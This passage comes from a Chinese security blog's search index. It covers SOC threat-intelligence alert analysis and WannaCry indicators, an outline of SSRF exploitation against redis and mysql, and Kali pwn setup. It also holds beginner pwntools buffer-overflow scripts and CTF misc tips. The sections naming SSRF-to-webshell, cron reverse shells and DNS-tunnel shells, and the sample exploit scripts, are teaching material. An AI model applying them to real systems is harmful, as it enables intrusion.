出现最新的攻击方法时，由于没有及时更新天眼的规则库，会导致一些告警出现企图的告警\n威胁情报威胁情报 （Threat Intelligence）是一种基于证据的描述威胁的一组关联的信息，包括威胁相关的环境信息、\n采用的手法机制、指标、影响，以及行动建议等。与传统的单点的病毒或信誉等信息不同，这一系列对于攻击威胁的\n信息，可以让我们了解高级威胁的全貌，并可以被抽象成可机读威胁情报（MRTI），用来进行应对决策，并对威胁\n进行响应。\n\n攻击特点 攻击背景\n攻击组织者\n攻击目的\n行业覆盖度\n活跃程度\n外链URL\n恶意IP\n恶意域名\n样本MD5\n......\n\nIOC（Indicator of Compromise）\n失陷指标&#x2F;特征\n\n可以反映主机或网络失陷特征信息，这些信息入侵工\n具、恶意软件和攻击组织的属性，如邮箱、域名、IP、\nURL、文件名、文件hash、证书和签名等，简称IOCs。\n\n威胁情报包含IOC\n僵尸网络\n“一控多”\n勒索病毒\n”勒索赎金“\n网络蠕虫\n“ 传染能力强 ”\n木马远控\n“远程控制”\n黑市工具\n“利用Nday漏洞投递样本”\n\n威胁情报告警分类\n远控木马\n远控木马一种恶意程序，其中包括在目标计\n算机上用于管理控制的后门。远程访问木马通常\n与用户请求的程序（如游戏程序）一起，是一种\n看不见的下载，或作为电子邮件附件发送。一旦\n主机系统被攻破，入侵者可以利用它来向其他易\n受感染的计算机分发远程访问木马，从而建立僵\n尸网络。\n远控木马\n远控木马——告警分析\n根据告警的IOC信息查询该威胁情报信息，根据情报提供的相关信息进行行为匹配。\n\n远控木马——告警分析\n根据情报提供的信息通过天眼进行日志检索，\n1 、不断的解析该域名down.luckyboy.cn\n2 、内网主机请求该域名上的au3.exe文件，命中情报信息。\n\n挖矿木马\n挖矿木马是一种入侵计算机系统并植入挖矿\n机赚取加密数字货币获利的病毒。\n\n矿工网络分成矿机、矿池、钱包等几个主要部分，有时矿池软件与钱包安装在一起，可合称为矿池。\n常见的挖矿协议：\n? GETWORK\n? Getblocktemplate 协议\n? STRATUM\n详细可参考：\nhttps:&#x2F;&#x2F;blog.csdn.net&#x2F;bluehawksky&#x2F;\narticle&#x2F;details&#x2F;80082590\nSTRATUM协议\n\n挖矿木马——告警分析\n根据天眼挖矿木马成功的查看数据包或检索流量日志，分析流量日志中是否存在挖矿流量\n\n勒索病毒\n勒索病毒，是一种新型电脑病毒，主要以邮\n件、程序木马、网页挂马的形式进行传播。该病\n毒性质恶劣、危害极大，一旦感染将给用户带来\n无法估量的损失。这种病毒利用各种加密算法对\n文件进行加密，被感染者一般无法解密，必须拿\n到解密的私钥才有可能破解。\n\n\n勒索病毒——永恒之蓝病毒\n了解勒索病毒的特性，攻击方式、传播途径、目的等等\n例如WannaCry勒索病毒\n? 感染后解析主机主动解析：\nhttp:&#x2F;&#x2F;www.iuqerfsodp9ifjaposdfjhgosurijfaewrwergwea.com；\n? 通过 445 端口（smb）利用ms17- 010 漏洞传播；\n? 感染后加密本地文件；\n? 释放本地文件：\nc:\\windows\\mssecsvc.exe、qeriuwjhrf、tasksche.exe；\n? 等等\n\n勒索病毒——告警分析\n根据勒索病毒的特性进行佐证的收集\n存在大量域名解析； 自身存在ms17- 010 漏洞； 通过 445 端口攻击内网机器；\n\n勒索病毒——修复建议\n修复建议：\n\n① 通过杀毒系统对当前主机进行全盘扫描并查杀病毒；\n\n② 尽快更新官方最新补丁，参考：\n\n③ https:&#x2F;&#x2F;technet.microsoft.com&#x2F;en-us&#x2F;library&#x2F;security&#x2F;ms17-010.aspx#Vulnerability Information，以及\n\n修复主机其它安全漏洞；\n\n④ 关闭135&#x2F;137&#x2F;138&#x2F;139&#x2F;445等端口；\n\n⑤ 关闭网络共享端口；\n\n⑥ 修改主机口令且密码满足复杂度要求（口令长度至少为 8 位，并由数字、大小字母与特殊字符组成）。\n\n勒索病毒——分析技巧\n如何判断勒索病毒类型\nhttps:&#x2F;&#x2F;lesuobingdu.qianxin.com&#x2F;\n\n告警分析小结小结一，情报分析流程\n确认告警信息\n分析威胁情报\n匹配网络攻击行为\n是否存在交互信息\n\n小结二，只有域名解析主机是否安全？\n① 可以利用域名解析协议实现SQL注入带外查询（OOB），例如：\n② 可以利用Dnscat2实现DNS隐蔽隧道反弹Shell\nDnscat2是一个DNS隧道工具，通过DNS协议创建加密的命令和控制通道。\n\n小结三，威胁情报可能产生误报的情况\n① 防火墙、邮件网关有发起黑域名解析的行为可能是误报\n② 威胁情报可能失效了，这时候需要更新威胁情报\n\n","slug":"AA_天眼&NGSOC告警分析","date":"2023-08-25T12:30:34.000Z","categories_index":"护网","tags_index":"奇安信,天眼,护网","author_index":"南瓜の无名"},{"id":"bb6da0936a3f7d1937a29b9bd18cfd0e","title":"知识体系_SSRF漏洞","content":"SSRF漏洞原理\n实质，就是攻击者控制主机A对主机B发起攻击。\n\n\n\n\nSSRF信息搜集-file伪协议\n\n对内网ip段依次访问查询arp缓存表寻找存活主机。\n\n\nSSRF信息搜集-Dict伪协议\n\nSSRF信息搜集-http伪协议\n\ngopher伪协议-SSRF基础利用\n\n\n做两次url编码，SSRF服务器和攻击目标服务器各一次。\n\n\nSSRF使用其他进制绕过127限制（环回地址绕过）\n\n\nSSRF使用302重定向绕过IP限制（302重定向绕过）\n\n\n\nDNS重绑定绕过\n\n\n\n\n使用SSRF进行命令执行\n\n\n使用SSRF POST命令执行\n\n\nSRF进行XXE漏洞利用\n\n\nSSRF进行SQL注入漏洞利用\n\n\n\n\n使用SSRF进行文件上传漏洞利用\n\n\n\n\n\n使用SSRF进行文件包含漏洞利用\n\n\n\n使用SSRF对mysql进行未授权查询\n\n\n\n\n\n\n\n\n使用SSRF对mysql未授权文件写入\n\n\n使用SSRF对comcat文件写入\n\n\n\n\n使用SSRF对redis未授权webshell写入\n本地抓包获取包\n\n\n追踪流-&gt;TCP流-&gt;选择红色发出流量；\n可以选择末尾添加quit\n\n将\\r\\n替换为%0d%0A, ?替换%3F\n第一次写的数据第二次回叠加，\npython2 gopherus.py –exploit redis 构造payload一把梭\n使用SSRF对redis未授权ssh公钥写入\n\n修改目录为&#x2F;root&#x2F;.ssh&#x2F; ； 修改文件名为authorized.key；\n将生成的id_rsa写入目标主机authorized.keys文件中\n\n上传公钥成功后直接使用本机私钥连接\n使用SSRF对redis未授权计划任务shell反弹\n\n\n","slug":"AA_知识体系_SSRF漏洞","date":"2023-08-25T12:30:34.000Z","categories_index":"知识体系","tags_index":"SSRF","author_index":"南瓜の无名"},{"id":"8f37158a20e4883949646d3e9bd7e230","title":"附录：pwn环境安装-kali","content":"附录：pwn环境配置-kali换源+代理apt换源sudo su\nvim &#x2F;etc&#x2F;apt&#x2F;sources.list\n\n注释掉官方的源，换成中科大的源。\n#中科大\ndeb http:&#x2F;&#x2F;mirrors.ustc.edu.cn&#x2F;kali kali-rolling main non-free contrib\ndeb-src http:&#x2F;&#x2F;mirrors.ustc.edu.cn&#x2F;kali kali-rolling main non-free contrib\n\napt-get update\napt-get upgrade\napt-get dist-upgrade\n\n配置代理\n\n\n\n\n\n\n\n\nhttps://zhuanlan.zhihu.com/p/461316494\n1. 利用物理机代理科学上网\n物理机安装clash（安装教程看官网ikuuu.art），打开系统代理，设置允许局域网链接。\n\n打开kali 系统的 &#x2F;etc&#x2F;proxychains4.conf 文件()，在文件末尾添加ip地址，例如 socks5 192.168.1.1 7777，端口是 clash 代理的端口。\n\n\n[ProxyList]\n# add proxy here ...\n# meanwile\n# defaults set to &quot;tor&quot;\n#socks4    127.0.0.1 9050\n\n# example\nsocks5  192.168.1.1 7777\n\n\n&#x2F;etc&#x2F;proxychains4.conf 配置文件里的 proxy_dns 这一行的记得给注释掉，然后保存\n\n验证是否成功，输入以下命令:\n\n\nproxychains curl ip.sb \n或\nproxychains curl cip.cc\n\n\n出现如下图说明配置成功了\n\n\n\n使用代理下载，在命令前加上proxychains就可以。\n\n2. 直接在虚拟机中安装代理\n虚拟机上安装clash（安装教程看官网ikuuu.art）\n打开kali 系统的&#x2F;etc&#x2F;proxychains4.conf 文件，在文件末尾添加ip地址，IP地址就是127.0.0.1，端口是clash代理的端口。\n\n[ProxyList]\n# add proxy here ...\n# meanwile\n# defaults set to &quot;tor&quot;\n#socks4    127.0.0.1 9050\n\n# example\nsocks5  127.0.0.1 7777\n\n\n以下同理，&#x2F;etc&#x2F;proxychains4.conf 配置文件里的 proxy_dns 这一行的记得给注释掉，然后保存\n\n验证是否成功，输入以下命令:\n\n\nproxychains curl ip.sb \n或\nproxychains curl cip.cc\n\n\n确认代理成功，使用代理下载，在命令前加上proxychains就可以。\n\n3. 使用redsocks全局代理（可选）\nkali系统内置的redsocks可以实现全局代理；\n\n打开配置文件找到redsocks方括号里的ip和port修改ip和端口：\n\n\nvim &#x2F;etc&#x2F;redsocks.conf\n\nbase &#123;\n\tlog_debug &#x3D; off;\n\tlog_info &#x3D; on;\n\tdaemon &#x3D; off;\n\tredirector &#x3D; iptables;\n&#125;\n\nredsocks &#123;\n\tlocal_ip &#x3D; 127.0.0.1;\n\tlocal_port &#x3D; 12345; &lt;&#x3D; 这个端口是tcp监听端口\n\n\tip &#x3D; 127.0.0.1;  &lt;&#x3D; socks5 服务地址 \n\tport &#x3D; 1081;  &lt;&#x3D; socks5 服务端口\n\n\ttype &#x3D; socks5; &lt;&#x3D; 一般都是 socks5 （ss, tro..）\n&#125;\n\nredudp &#123;\n\tlocal_ip &#x3D; 127.0.0.1;\n\tlocal_port &#x3D; 10053; &lt;&#x3D; 这个端口是udp监听端口\n\n\tip &#x3D; 127.0.0.1; &lt;&#x3D; socks5 服务地址\n\tport &#x3D; 1081; &lt;&#x3D; socks5 服务端口\n\n\t&#x2F;&#x2F; login &#x3D; username;  &lt;&#x3D; 无需登录信息，删除\n\t&#x2F;&#x2F; password &#x3D; pazzw0rd; &lt;&#x3D; 同上\n\n\tdest_ip &#x3D; 8.8.8.8;\n\tdest_port &#x3D; 53;\n\n\tudp_timeout &#x3D; 30;\n\tudp_timeout_stream &#x3D; 180;\n&#125;\n\ndnstc &#123;\n\tlocal_ip &#x3D; 127.0.0.1;\n\tlocal_port &#x3D; 5300;\n&#125;\n\ndnsu2t &#123;\n\tlocal_ip &#x3D; 127.0.0.1;\n\tlocal_port &#x3D; 5313;\n\n\tremote_ip &#x3D; 8.8.8.8;\n\tremote_port &#x3D; 53;\n&#125;\n\n\n使用sudo redsocks命令运行redsocks，\n在桌面目录新建一个目录，然后新建一个iptables.sh名的文件,复制以下内容在文件里，\n\n#不重定向目的地址为服务器的包\niptables -t nat -A OUTPUT -d 192.168.0.84 -j RETURN  #请用你的shadowsocks服务器的地址替换$SERVER_IP\n \n#不重定向私有地址的流量\niptables -t nat -A OUTPUT -d 10.0.0.0&#x2F;8 -j RETURN\niptables -t nat -A OUTPUT -d 172.16.0.0&#x2F;16 -j RETURN\niptables -t nat -A OUTPUT -d 192.168.0.0&#x2F;16 -j RETURN\n \n#不重定向保留地址的流量,这一步很重要\niptables -t nat -A OUTPUT -d 127.0.0.0&#x2F;8 -j RETURN\n \n#重定向所有不满足以上条件的流量到redsocks监听的12345端口\niptables -t nat -A OUTPUT -p tcp -j REDIRECT --to-ports 12345 #12345是你的redsocks运行的端口,请根据你的情况替换它\n\n\n执行 iptables.sh ：\n\nsh iptables.sh\n\n\n输入curl ip.sb列出的IP地址和proxychains curl ip.sb列出的IP地址一致，说明配置成功\n\n\n4. 关闭redsocks全局代理（补充）\n你可以使用以下命令查看当前iptables规则：\n\niptables -t nat -L\n\n\n如果你想关闭全局代理，可以写一个uniptables.sh并运行：\n\niptables -t nat -D OUTPUT -d 192.168.0.84 -j RETURN \n#请用你的shadowsocks服务器的地址替换$SERVER_IP\n\niptables -t nat -D OUTPUT -d 10.0.0.0&#x2F;8 -j RETURN\niptables -t nat -D OUTPUT -d 172.16.0.0&#x2F;16 -j RETURN\niptables -t nat -D OUTPUT -d 192.168.0.0&#x2F;16 -j RETURN\niptables -t nat -D OUTPUT -d 127.0.0.0&#x2F;8 -j RETURN\n\niptables -t nat -D OUTPUT -p tcp -j REDIRECT --to-ports 12345 \n#12345是你的redsocks运行的端口,请根据你的情况替换它\n\n\n找到redsocks的pid，并关闭redsocks的进程：\n\npidof redsocks\nsudo kill （redsocks的pid）\n\n工具安装\n\n\n\n\n\n\n\n\n没有换源＋代理安装工具时可能会很痛苦。\npwntoolskali自带python2,3环境。\npip install pwntools\n\npython -c &#39;from pwn import *&#39;\n# 验证安装是否成功\n\ngdb+peda+pwndbg+gef\n\n\n\n\n\n\n\n\nhttps://github.com/apogiatzis/gdb-peda-pwndbg-gef\n安装：\ncd ~ &amp;&amp; git clone https:&#x2F;&#x2F;github.com&#x2F;apogiatzis&#x2F;gdb-peda-pwndbg-gef.git\ncd ~&#x2F;gdb-peda-pwndbg-gef\n.&#x2F;install.sh\n\n命令：\ngdb-peda\ngdb-peda-intel\ngdb-peda-arm\ngdb-pwndbg\ngdb-gef\n\n补充：\n# 如果安装pwndbg网络延时报错，记得加代理。一次不行多试几遍。\n\nlibc查询版本网站\n\n\n\n\n\n\n\n\n在线网站：https://libc.blukat.me/建议科学上网，要不然加载速度有点慢\n","slug":"note_pwn环境安装","date":"2023-08-25T12:30:34.000Z","categories_index":"pwn前置","tags_index":"pwn","author_index":"南瓜の无名"},{"id":"c73e3f9c5f4b12ffaf59a917c0b0e6c2","title":"学习笔记_pwn_前置知识","content":"\n\n\n\n\n\n\n\n\n学习网站：https://ctf-wiki.org/pwn/linux/user-mode/environment/推荐课程：https://www.bilibili.com/video/BV1mr4y1Y7fW/\n前置知识\n\n\n\n\n\n\n\n\n学 pwn 之前先学 8086汇编就可以。\n概述\n破解、利用成功（程序的二进制漏洞）\n攻破（设备、服务器）\n控制（设备、服务器）\n\n名词解释\nexploit\n用于攻击的脚本与方案\n\n\npayload\n攻击载荷，是对目的进程被劫持控制流的数据\n\n\nshellcode\n调用攻击目标的shell的代码\n\n\n\n常用或不常用的指令\nfile指令用于确定给定文件的类型。它会读取文件的特定部分并尝试确定文件的格式，例如可执行文件、共享库、文本文件等。（重要）\nldd指令用于打印可执行文件或共享库所依赖的共享库列表。它会分析可执行文件或共享库的依赖关系，并列出该文件需要加载的共享库的路径。（重要）\nnm指令用于显示可执行文件或共享库中的符号表信息。它可以列出函数、变量和其他符号的名称以及它们的地址。\nhexdump指令用于以十六进制格式显示文件的内容。它会将文件的每个字节转换为十六进制，并显示它们的偏移量和字符表示形式。\nobjdump -d -M intel指令用于以Intel格式显示目标文件或可执行文件的反汇编代码。（不常用）\n-d选项表示需要显示反汇编代码。\n-M intel选项表示使用Intel格式显示指令。\n\n\nreadelf -a指令用于显示目标文件或可执行文件的所有节(Sections)的详细信息。（不常用）\n\ngcc 编译程序过程GCC中四个编译过程的相应命令：\n\n预处理（Preprocessing）：\n\n使用gcc -E命令进行预处理，生成预处理后的代码文件。\n例如：gcc -E source.c -o preprocessed.c\n\n\n编译（Compilation）：\n\n使用gcc -S命令进行编译，生成汇编代码文件。\n例如：gcc -S preprocessed.c -o assembly.s\n\n\n汇编（Assembly）：\n\n使用gcc -c命令进行汇编，生成目标文件。\n例如：gcc -c assembly.s -o object.o\n\n\n链接（Linking）：\n\n使用gcc命令进行链接，生成最终的可执行文件。\n例如：gcc object.o -o executable\n\n\n\n一些 gcc 编译指令GCC编译32位程序：sudo apt-get install gcc-multilib g++-multilib module-assistant\n编译选项：gcc -m32 test.c -o testgcc test.c -fno-omit-frame-pointer -o testgcc -m32 test.c -fno-omit-frame-pointer -o test\n\n-fno-omit-frame-pointer选项：\n\n禁用省略帧指针。\n\n\n“-no-pie”选项：\n\n默认情况下，gcc会生成可执行文件以PIE的形式，可执行文件的加载地址是可变的。\n“-no-pie”可以禁用PIE，生成传统的非位置无关可执行文件。\n\n\n“-static”选项：\n\n默认情况下，gcc会生成使用动态链接的可执行文件，可执行文件在运行时需要依赖系统中已安装的共享库。\n“-static”生成静态链接的可执行文件，可执行文件会将所有依赖的库静态地链接到可执行文件中，在运行时不再依赖于系统中的共享库。\n\n\n\n部分寄存器的功能\nRIP\n存放当前执行的指令的地址。\n\n\nRSP\n存放当前栈帧的栈顶地址。\n\n\nRBP\n存放当前栈帧的栈底地址。\n\n\nRAX\n通用寄存器。存放函数返回值。\n\n\n\n\n\n\n\n\n\n\n\n\n都可以类比8086汇编的寄存器，很好理解。\n常用的汇编指令\nMOV\nLEA\nADD&#x2F;SUB\nPUSH\nPOP\nCMP\nJMP\nJ[Condition] JCC\nCALL\nLEAVE\nRET\n· · ·\n\n\n\n\n\n\n\n\n\n\n如果你想追求程序极致的运行速度，可以参照英特尔的白皮书手写更复杂的汇编。\n# 一些汇编代码可以相互转化，编译器会进行择优选择。\nsub rbp,0x18    &#x2F;&#x2F; 4\nmov rax,rbp     &#x2F;&#x2F; 3\n↓\nlea rax,[rbp-0x18]  &#x2F;&#x2F; 4\n\nxor ebx,ebx     &#x2F;&#x2F;2\n↓\nmov ebx,0       &#x2F;&#x2F;5\n\ncmp 和 sub 类似，cmp不存值，sub存值。\n\ntest 和 &amp; 类似，\ntest eax,eax    eax&amp;eax   eax&#x3D;0-&gt;0  eax!&#x3D;0-&gt;!0\n↓\ncmp eax,0\n\npush ebp: esp-4，把ebp放入esp指的地方\npop ebp: 把esp指的地方赋值给 ebp，esp+4\n\ncall: push eip ; jmp func\n\nleave: mov esp,ebp ; pop ebp\nret: pop eip\n\n动态调试器\n运行\n步入，步过，步出，步止\n断电（设置，删除，显示）\n查看内存、寄存器、各种参数\n设置内存、寄存器、各种参数（加载文件）\n远程调试\n其他辅助功能\n\ngdb 动态调试\n(gdb) run 用于直接启动程序的执行。\n\n(gdb) start 用于启动程序的执行，但会在程序的入口点处设置一个断点。\n\n(gdb) i r 显示当前程序的寄存器状态\n\n(gdb) disassemble $rip\n\n~&#x2F;.gdbinit\nset disassembly-flavor intel\n\n\n(gdb) b *地址 设置断点\n\n(gdb) i b 显示当前已设置的断点信息。\n\n(gdb) c 跳过当前断点或停止点，用于继续程序的执行。\n\n(gdb) disable b 3 禁用编号为3的断点。\n\n(gdb) enable b 3 启用编号为3的断点。\n\n(gdb) ni 执行下一条机器指令。\n\n(gdb) si 单步执行程序并进入函数。\n\n(gdb) finish 让程序执行完当前函数并停止。\n\n(gdb) x&#x2F;[格式] [地址] 查看内存中的数据。\n\n通过(gdb) x命令，可以以不同的格式查看内存中的数据。以下是一些常见的用法示例：\n(gdb) x&#x2F;1b [地址]：以字节（byte）格式查看指定地址的内容。\n(gdb) x&#x2F;2w [地址]：以字（word）格式查看指定地址的内容。\n(gdb) x&#x2F;4x [地址]：以十六进制格式查看指定地址的内容。\n(gdb) x&#x2F;s [地址]：以字符串格式查看指定地址的内容。\n(gdb) x&#x2F;20gx [地址]命令用于以十六进制格式查看指定地址附近的20个64位数据。\n(gdb) x/20i $rip命令用于查看当前指令地址（$rip）附近的指令。\n\n\n\n\n(gdb) set [变量名]&#x3D;[值] 通过该命令可以修改变量的值。\n\nset *((unsigned int)$ebp)&#x3D;0x18\n\n\n\n\npwndbg 调试的一些命令包含gdb调试的大多数命令。\npwndbg&gt; cyclic 100 # 生成长度100，特定重复模式的字符串\npwndbg&gt; cyclic -l 四个字符  # 定位重复模式中特定字符的位置\n\npwndbg&gt; distance 0x7fffffffdd60 0x7fffffffdd10\n# 计算两个内存地址之间的距离\n\npwndbg&gt; vmmap   #查看内存分配情况\n\nchecksec 检查程序安全性checksec binary\n# 查看二进制文件的各种安全保护机制是否开启或禁用\n\nchecksec命令会显示以下安全保护机制的状态：\n\n软件堆栈保护（Stack Canary）：用于检测缓冲区溢出漏洞。\n可执行空间保护（Executable Space Protection）：防止代码注入攻击。\n数据执行保护（Data Execution Prevention）：防止执行非可执行内存中的代码。\n地址空间布局随机化（Address Space Layout Randomization）：随机化内存布局，增加攻击者的难度。\n文件位置独立（Position Independent Executable）：使二进制文件能够在任意地址加载。\n\n可执行文件\n广义：文件中的数据是可执行代码的文件\n.out .exe .sh .py\n\n\n狭义：文件中的数据是机器码的文件\n.out .exe .dll .so\n\n\n\n可执行文件分类\nWindows：PE（Protable Executable）\n可执行程序\n.exe\n\n\n动态链接库\n.dll\n\n\n静态链接库\n.lib\n\n\n\n\nLinux：ELF（Executable and Linkable Format）\n可执行程序\n.out\n\n\n动态链接库\n.so\n\n\n静态链接库\n.a\n\n\n\n\n\nLinux下的可执行文件格式ELF\nELE文件头表（ELE header）\n记录了ELE文件的组织结构\n\n\n程序头表（Program header table）\n告诉系统图和创建进程\n生成进程的可执行文件必须拥有此结构\n重定位文件不一定需要\n\n\n节头表（Section header table）\n记录了ELE文件的节区信息\n用于链接的目标文件必须拥有此结构\n其它类型目标文件不一定需要\n\n\n\n磁盘中的ELF与内存中的ELF\n\n\n\n\n\n\n\n\n\n\n注意相对应的权限。\nELF文件到虚拟地址空间的映射\n进程虚拟地址空间\n虚拟内存用户空间每个进程一份\n虚拟内存内核空间所有进程共享一份\n虚拟内存mmap段中的动态链接库仅在物理内存中装载一份\n\n\n静态存储区和动态存储区\n段（segment）与节（section）概念\n代码段（Text segment）只包含了代码与只读数据\n.text 节\n.rodata 节\n.hash 节\n.dynsym 节\n.dynstr 节\n.plt 节\n.rel.got 节\n···\n\n\n数据段（Data segment）包含了可读可写数据\n.data 节\n.dynamic 节\n.got 节\n.got.plt 节\n.bss 节\n···\n\n\n栈段（Stack segment）\n\n段（segment）与节（section）的关联\n一个段包含多个节\n段视图用于进程的内存区域的 rwx 权限划分\n节视图用于ELF文件编译链接时与在磁盘上存储时的文件结构的组织\n\n大端序与小端序\n\n小端序\n低地址存放数据低位、高地址存放数据高位\n较为常见的格式\n\n\n\n\n\n大端序\n低地址存放数据高位、高地址存放数据低位\n\n\n\n程序的执行过程\n静态链接的程序的执行过程\n动态链接的程序的执行过程\npython脚本简单示例不使用pwntools\n\n\n\n\n\n\n\n\npython 脚本可以发送不可打印字符。\n示例：\n# python2\nimport socket\nimport telnetlib\nimport struct\n\n&#39;&#39;&#39;\n def p32(val):\n  # 将32位的整数转化为字符串（小端模式）\n  return struct.pack(&quot;&quot;,val)\n&#39;&#39;&#39;\n\ndef pwn():\n  # 创建一个TCP socket\n  s &#x3D; socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n  # 连接服务器 xxx.x.x.x 的 xxxx 端口\n  s.connect((&quot;xxx.x.x.x&quot;, xxxx))\n  # 填充数据\n  payload &#x3D; &#39;a&#39; * 8 + &#39;\\x10&#39;\n  s.sendall(payload + &#39;\\n&#39;)\n  # 创建 telnet 来产生一个控制服务器的 shell\n  t &#x3D; telnetlib.Telnet()\n  t.sock &#x3D; s\n  t.interact()\n\nif __name__ &#x3D;&#x3D; &quot;__main__&quot;:\n  pwn()\n\n使用pwntools\n\n\n\n\n\n\n\n\n官方中文文档：https://pwntools-docs-zh.readthedocs.io/zh_CN/dev/intro.html\n示例1：\nfrom pwn import *\n\ncontext(log_level&#x3D;&#39;debug&#39;,arch&#x3D;&#39;amd64&#39;,os&#x3D;&#39;linux&#39;)\nio &#x3D; process(&#39;.&#x2F;test&#39;)\n\n# io.recvuntil(&#39;input:\\n&#39;)\n# io.send(&#39;发送的内容&#39;)   # io.sendline(&#39;发送的内容&#39;)‘\npayload &#x3D; b&#39;a&#39;*9 + p64(0x4011b7)\ngdb.attach(io)\npause()\n\ndem &#x3D; b&#39;input\\n&#39;\nio.sendlineafter(dem,payload)\n\nio.interacive()\n\n示例2：\nfrom pwn import *\ncontext(log_level&#x3D;&#39;debug&#39;,arch&#x3D;&#39;i386&#39;,os&#x3D;&#39;linux&#39;)\npwnfile &#x3D; &#39;.&#x2F;test&#39;\nio &#x3D; process(pwnfile)\n# io &#x3D; remote(&#39;&#39;, )\nelf &#x3D; ELF(pwnfile)\nrop &#x3D; ROP(pwnfile)\n\npadding2ebp &#x3D; 0x10  # 0x14\npadding &#x3D; padding2ebp + context.word_size &#x2F;&#x2F; 8\n# 通过调试得到\n\nreturn_addr &#x3D; 0x80691f  # 返回地址\npayload &#x3D; b&#39;a&#39; * padding + p32(return_addr)\n# payload &#x3D; flat([&#39;a&#39;*padding,return_addr])\ndelimiter &#x3D; &#39;input:&#39;\nio.sendlineafter(delimiter,payload)\nio.interactive()\n","slug":"学习笔记_pwn_前置知识","date":"2023-08-25T12:30:34.000Z","categories_index":"pwn前置","tags_index":"pwn","author_index":"南瓜の无名"},{"id":"0cb170795b119823c21528234910bfc1","title":"杂项摆烂的小记_基础篇_01","content":"\n\n\n\n\n\n\n\n\n杂项真的很杂，但也有规律可循。温故知新，是一些零零碎碎的做题笔记。\n新的盐图片宽高错误有一张png图片在kali打不开，简单尝试无果，转到Windows用stegsolve打开，找到file format模块，发现CRC校验不正确；用winhex或者010editor打开图片，修改第二行的图片宽高，稍微改大一些就可以；再次打开图片发现flag。\npyc反编译stegsolve扫描图片得到二维码，扫描二维码发现一堆十六进制数，十六进制转ASCII码中发现了flag和1.py和1.pyt等关键字，保存为.pyc格式反编译得到.py文件。pyc反编译网址：https://tool.lu/pyc/\n用strings命令从流量包找flagstrings命令用于在二进制文件中查找并打印可打印的ASCII字符串。它会扫描给定的文件或输入流，并提取其中的字符串。\nstrings命令常用于分析二进制文件，例如可执行文件、库文件或任何其他二进制文件，以查找包含的文本信息。\nkali 中使用 strings 即查找 流量包.pcapng 中的带有“{”的 ASCII 字符串strings webshell.pcapng | grep {\n用 strings 命令读取 elf 文件string 文件名 | grep {\n当然，也可以放到winhex、010editor里面寻找。\nevince 和 okular 打开 pdf 都很好用注意打开文件的权限和你现在的用户，kali用户有的权限root用户不一定有。\n用法：\n  evince [选项...] [文件...] GNOME文档查看器\n帮助选项：\n  -h, --help                  显示帮助选项\n  --help-all                  显示所有帮助选项\n  --help-gtk                  显示GTK+选项\n应用程序选项：\n  -o, --new-window            打开一个新窗口。\n  -p, --page-label&#x3D;PAGE       显示指定页码的文档。\n  -i, --page-index&#x3D;NUMBER     显示指定页数的文档。\n  -n, --named-dest&#x3D;DEST       显示指定名称的目标位置。\n  -f, --fullscreen            以全屏模式运行evince\n  -s, --presentation          以演示模式运行evince\n  -w, --preview               以预览模式运行evince\n  -l, --find&#x3D;STRING           在文档中查找指定的单词或短语\n  --display&#x3D;DISPLAY           使用的X显示\n\nstegsolve 找到的二维码扫不出来二维码有时候并不能完整出现，部分存在缺失，可以分多次找到缺失的地方，再使用ps进行拼接得到完整的二维码。\n题目：时间刺客！压缩包里有四个文件，将四个文件的创建时间视作一些ASCII码可见字符的拼接，然后转换成文本之后就能获得 flag。\nimport io\nimport re\nimport os\n\nresult_str &#x3D; &#39;&#39;\n\nfile_list &#x3D; [&#39;1.jpg&#39;, &#39;2.jpg&#39;, &#39;3.jpg&#39;, &#39;4.jpg&#39;]\nfor i in file_list:\n    filepath &#x3D; &#39;.&#x2F;附件&#x2F;&#39; + i\n    print(i)\n    # print( int( (( os.path.getmtime(filepath) * (10 ** 9) ) % (2 ** 64 - 1) ) &#x2F; (10 ** 9)) )\n    result_str +&#x3D; str( int(  os.path.getmtime(filepath)   ) ) \n\nprint(result_str)\n\nnum_list &#x3D; re.findall(r&#39;1[0-2][0-9]|[4-9][0-9]&#39;,result_str)\n\nprint(num_list)\nprint(bytes(int(i) for i in num_list).decode())\n\n题目：steg 没有 py# 安装stegpy\npip install stegpy\ngit clone https:&#x2F;&#x2F;gitcode.net&#x2F;mirrors&#x2F;dhsdshdhk&#x2F;stegpy.git\ncd stegpy\nsudo python3 setup.py install\n\nstegpy xx.webp -p\n#如果没有密码直接回车就可\n#具体参数可以stegpy -h 查看帮助\n\n题目：来自银河的信号RX-SSTV 工具  略。\n利用GPS数据绘制运动轨迹\n\n\n\n\n\n\n\n\nhttps://www.gpsvisualizer.com/map_input把文件导入网站，点击绘制轨迹。\n利用工具进行文件分离文件分离 binwalk + ddbinwalk 题目文件名\n&#x2F;&#x2F; 根据binwalk得到的信息\ndd if&#x3D;[题目文件名] of&#x3D;[分离后输出的文件名] skip&#x3D;[根据binwalk得到] bs&#x3D;1\n\nbinwalk 提取文件binwakl -e test --run-as&#x3D;root\n\nforemost 分割文件 &#x2F; 修复文件 foremost是一个用来从磁盘映像或文件中恢复文件类型的命令行工具。它可以恢复多种格式的文件,如图片、文档、视频等。\n# 分割文件\nforemost -i image.png -o output\n\n# 从evidence.img中恢复大小大于100KB的pdf文件。\nforemost -t pdf -s 100k -v -i evidence.img -o output\n\n用法小结：\nforemost [-v|-V|-h|-T|-Q|-q|-a|-w-d] [-t &lt;type&gt;] [-s &lt;blocks&gt;] [-k &lt;size&gt;]\n    [-b &lt;size&gt;] [-c &lt;file&gt;] [-o &lt;dir&gt;] [-i &lt;file]\n\n-V  - 显示版权信息并退出\n-t  - 指定文件类型.  (-t jpeg,pdf ...)\n-d  - 打开间接块检测 (针对UNIX文件系统)\n-i  - 指定输入文件 (默认为标准输入)\n-a  - 写入所有的文件头部, 不执行错误检测(损坏文件)\n-w  - 向磁盘写入审计文件，不写入任何检测到的文件\n-o  - 设置输出目录 (默认为.&#x2F;output)\n-c  - 设置配置文件 (默认为foremost.conf)\n-q  - 启用快速模式. 在512字节边界执行搜索.\n-Q  - 启用安静模式. 禁用输出消息.\n-v  - 详细模式. 向屏幕上记录所有消息。\n\n注意： 指定存放文件的目录必须为空，不然会报错。-T 选项让foremost自动根据当前时间戳来生成output目录，这时生成的目录是类似这样的 output_Wed Jan 30 16_01_56 2019。\n破解压缩包密码zip 和 rar 解压unzip 压缩包.zip\nunrar x 压缩包.rar\n\n压缩包伪加密zip伪加密是在文件头的加密标志位做修改，进而再打开文件时识被别为加密压缩包。\n寻找 50 2B 01 02 ，跳过四个字节（1F 00 14 00），就是全局方式位。\n\n把压缩源文件目录区的全局方式位标记的  01  00 或 09 00  